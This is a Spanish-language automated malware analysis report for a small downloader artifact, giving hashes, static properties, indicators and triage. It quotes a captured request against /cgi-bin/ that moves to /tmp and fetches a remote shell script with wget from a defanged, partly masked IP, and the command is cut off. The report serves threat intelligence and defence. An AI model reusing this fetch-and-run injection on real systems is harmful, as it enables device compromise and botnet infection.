# 🧬 Payload Analysis

`82dc439df9a8e48b09e93b8106f5930c4cca1a7cfeba0fd136373ecd73be582b`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 250 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `82dc439df9a8e48b09e93b8106f5930c4cca1a7cfeba0fd136373ecd73be582b`
- **SHA1:** `7217d998de7a0abcbdf7fc5b8ca8a23ba5472b97`
- **MD5:** `470e04961c6865c28882885a7f409347`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 250 B |
| Entropía | 4.96 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;cur
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;cur | strings |
| hash | 82dc439df9a8e48b09e93b8106f5930c4cca1a7cfeba0fd136373ecd73be582b | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
